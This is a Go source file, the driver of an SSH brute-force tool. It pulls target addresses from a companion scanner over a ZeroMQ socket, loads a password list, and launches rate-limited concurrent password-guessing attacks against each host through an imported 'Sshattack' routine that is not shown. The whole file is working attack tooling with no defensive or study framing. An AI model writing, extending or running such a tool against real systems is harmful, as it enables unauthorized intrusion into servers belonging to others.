package main

import (
	sshattack "SkyIsYours/bruter/ssh"
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"

	zmq "github.com/pebbe/zmq4"
)

func bruter(target string, rate int, pull *zmq.Socket) {
	var passwords []string
	sem := make(chan struct{}, 5)
	file, err := os.Open(target)
	if err != nil {
		log.Fatalln("\033[31mError opening file:", err, "\033[31m")
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	for {
		sem <- struct{}{}
		result, err := pull.Recv(0)
		if err != nil {
			log.Fatalln(err)
		}
		go sshattack.Sshattack(result, passwords, rate, sem)
	}
}

func getDefaultValue(value, defaultValue string) string {
	if value == "" {
		return defaultValue
	}
	return value
}

func main() {
	ipcPtr := flag.Bool("ipc", false, "use interprocess communication")
	passPtr := flag.String("passwd", "", "path to password file")
	hostPtr := flag.String("shost", "", "scanner IP")
	portPtr := flag.String("sport", "", "scanner port number")
	ratePtr := flag.String("rate", "", "rate of brute force")

	flag.Parse()

	port := getDefaultValue(*portPtr, "5544")
	host := getDefaultValue(*hostPtr, "127.0.0.1")
	rateStr := getDefaultValue(*ratePtr, "100")
	ipc := *ipcPtr
	file := *passPtr

	rateInt, err := strconv.Atoi(rateStr)

	if err != nil {
		log.Println("Using default rate (100) due to an invalid rate value")
		rateInt = 100
	}

	if host == "0.0.0.0" {
		host = "*"
	}

	if host == "" {
		log.Fatalln("Specify scanner host (--shost)")
	}

	if port == "" {
		log.Fatalln("Specify scanner port (--sport)")
	}

	if file == "" {
		log.Fatalln("\033[31mNo password file specified (--passwd <path>)\033[0m")
	}
	if _, err := os.Stat(file); err != nil {
		if os.IsNotExist(err) {
			log.Fatalf("The file %s does not exist.\n", file)
		} else {
			log.Fatalf("Error checking the file: %v\n", err)
		}
	}

	context, err := zmq.NewContext()
	if err != nil {
		log.Fatalln(err)
	}

	pull, err := context.NewSocket(zmq.PULL)
	if err != nil {
		log.Fatalln(err)
	}

	var connection string
	if !ipc {
		connection = fmt.Sprintf("tcp://%s:%s", host, port)
	} else {
		connection = "ipc:///tmp/Sky"
	}

	err = pull.Connect(connection)
	if err != nil {
		log.Fatalf("Error connecting to %s: %v\n", connection, err)
	}

	log.Printf("Connected on %s\n", connection)
	bruter(file, rateInt, pull)
}
